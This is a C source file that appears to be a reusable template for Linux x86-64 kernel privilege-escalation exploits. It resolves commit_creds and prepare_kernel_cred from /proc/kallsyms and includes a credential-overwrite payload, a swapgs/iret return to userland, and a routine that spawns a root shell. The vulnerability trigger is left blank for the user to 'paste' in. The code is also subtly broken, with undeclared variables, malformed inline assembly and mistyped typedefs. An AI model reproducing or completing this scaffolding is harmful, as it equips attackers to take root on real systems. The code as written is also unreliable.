#define _GNU_SOURCE
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

/*
 * gcc linux_kernel_x64.c -o linux_kernel_x64
 */

/* 
 * definition of useful structures
 */
struct cred;
struct task_struct;

struct symbol
{
  unsigned long long addr;
  char type;
  char name[32];
} s;

/*
 * typedef declaration for the kernel functions
 */
typedef __attribute__((regparm(3))) (*__commit_creds)(struct cred*);
typedef __attribute__((regparm(3))) (*__prepare_kernel_cred)(struct task_struct*);

__commit_creds commit_creds;
__prepare_kernel_cred prepare_kernel_cred;

unsigned long long user_ss, user_rflags, user_cs, user_rsp;

/*
 * parse line from /proc/kallsyms
 */
int parse_symbol(char *line)
{
  char *endptr;

  s.addr = strtoull(line, &endptr, 16);

  s.type = endptr[0];
  strtok(endptr, " ");
  endptr = strtok(NULL, "\x09");
  strncpy(s.name, endptr, 32);

  return 0;
}

/*
 * return the address from a given symbol name
 */
unsigned long long get_symbol_address(char *name)
{
  FILE *fp = NULL;
  char *line = NULL;
  int read = 0;
  size_t len = 0;

  memset(&s, 0, sizeof(s));

  fp = fopen("/proc/kallsyms", "r");
  if (fp == NULL)
    return 0;

  while ((read = getline(&line, &len, fp)) != -1)
  {
    if (line[read - 1] == '\n') line[read - 1] = '\0';

    if(parse_symbol(line))
      return 0;

    if (strcmp(s.name, name) == 0)
    {
      printf("[+] Found symbol %s : 0x%08x\n", s.name, s.addr);
      return s.addr;
    }
  }

  free(line);
  fclose(fp);

  return 0;
}

/*
 * exec /bin/sh
 */
void exec_shell(void) {
  char *shell = "/bin/sh";
  char *args[] = {shell, "-i", NULL};

  if (getuid() == 0)
  {
    printf("[+] Exploit succeeded, enjoy your root!\n");
    execve(shell, args, NULL);
  } else {
    printf("[+] Exploit failed.\n");
  }
  
  exit(0);
}

/*
 * modify credentials
 */
void get_root(void)
{
  commit_creds(prepare_kernel_cred(0));
}

/*
 * come back to user land
 */
void ret_to_userland(void)
{
  __asm__(
      "swapgs\t\n",
      "movq %0, 0x20(%%rsp)\t\n"
      "movq %1, 0x18(%%rsp)\t\n"
      "movq %2, 0x10(%%rsp)\t\n"
      "movq %3, 0x08(%%rsp)\t\n"
      "movq %4, 0x00(%%rsp)\t\n"
      "iret"
      : : "r" (user_ss),
          "r" (user_rsp),
          "r" (user_rflags),
          "r" (user_cs),
          "r" (exec_shell),
      );
}

/*
 * save userland context
 */
void save_userland_context(void)
{
  __asm__(
      "movq %%cs, %0\t\n"
      "movq %%ss, %1\t\n"
      "movq %%gs, %2\t\n"
      "movq %%rsp, %3\t\n"
      "pushfq\t\n"
      "popq %4\t\n"
      : "=r" (user_cs), "=r" (user_ss), "=r" (user_gs), "=r" (user_esp), "=r" (user_rflags) : : "memory"
      );
}

/*
 * exploit function
 */
void exploit(void)
{
  /*
   * paste your exploit here
   */
}

/*
 * main function
 *   - look for some useful symbol addresses
 *   - trigger the exploit
 */
int main(int argc, char **argv)
{
  // retrieve kernels symbols
  commit_creds = (__commit_creds)get_symbol_address("commit_creds");
  prepare_kernel_cred = (__prepare_kernel_cred)get_symbol_address("prepare_kernel_cred");

  if (commit_creds == 0 || prepare_kernel_cred == 0)
  {
    printf("[-] Cannot find symbols addresses.\n");
    return 1;
  }

  // save the userland context
  save_userland_context();

  // exploit code
  exploit();

  return 0;
}
